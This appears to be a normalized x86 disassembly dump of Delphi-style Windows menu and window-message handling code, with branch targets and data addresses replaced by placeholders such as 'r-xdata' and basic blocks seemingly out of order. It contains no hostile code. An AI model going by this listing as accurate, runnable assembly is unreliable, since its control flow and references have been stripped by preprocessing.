mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_455444
mov ebx eax
xor edx edx
mov eax edi
call sub_455940
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_454dac
mov eax [ esi + 0x34 ]
call sub_454dac
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_452ce8
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_448d84
push eax
call DrawMenuBar
sub_455e80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_455e80
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_4037e4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_455cd8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_454dac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_455e70
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_455fd4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_424d9c
xor eax eax
push ebp
push sub_4560d2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424d9c
xor eax eax
push ebp
push sub_4560a7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_455e80
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424d94
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4560d9
mov eax [ rw-data ]
call sub_424d94
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_455cd8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4560f8
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45647c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45647c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4561b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_456750
mov eax ebx
call sub_4089a4
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_456254
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4561b4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404304
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404554
lea edx [ ebp - 0x200 ]
call sub_408a94
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4562e8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_456358
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4567f8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4567f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4567f8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_456364
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_456254
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_4562e8
mov eax ebx
call sub_45681c
jmp r-xdata
sub_4563cc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_456414
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_450644
mov eax ebx
call sub_455c28
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_450688
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419e80
sub_456450
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a0cc
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_456414
sub_456494
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455cd8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_455cd8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45a280
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_4564f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4565c5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455cd8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_455cd8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_454884
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_454894
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40427c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40427c
mov eax [ ebp - 0xc ]
pop edx
call sub_408090
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45733c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4565cc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4040b8
retn
sub_4565d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_456494
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4564f0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_456750
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_455e5c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_455cd8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_455cd8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408a74
mov eax [ ebp + 0x10 ]
call sub_40898c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45681c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43f3dc
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4567f8
mov [ ebx + 0x41 ] 0x1
sub_456844
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4567f8
mov [ ebx + 0x41 ] 0x1
sub_4568d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4563cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_456254
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_456960
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45699c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4037e4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4569e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456f1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f22
lea eax [ ebp - 0x30 ]
call sub_404094
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ esi + 0x4 ]
call sub_455d94
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_463a18
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov dx [ esi + 0x4 ]
call sub_455d78
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_456d4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_456d31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e2b4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e130
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4571c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d38
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e2b4
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4565d8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_455cd8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_455cd8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_456e91
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_456e6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_456e4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41e2b4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e130
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e56
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e2b4
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43f660
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463a18
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_455cd8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_455cd8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_455cd8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_455d08
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_455d08
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4636bc
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_463724
jmp r-xdata
sub_456e73
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_456f2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_414210
pop esi
pop ebx
retn
push ebx
push sub_45699c
call sub_41aefc
mov [ ebx + 0x10 ] eax
sub_456f70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455af0
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_456f2c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
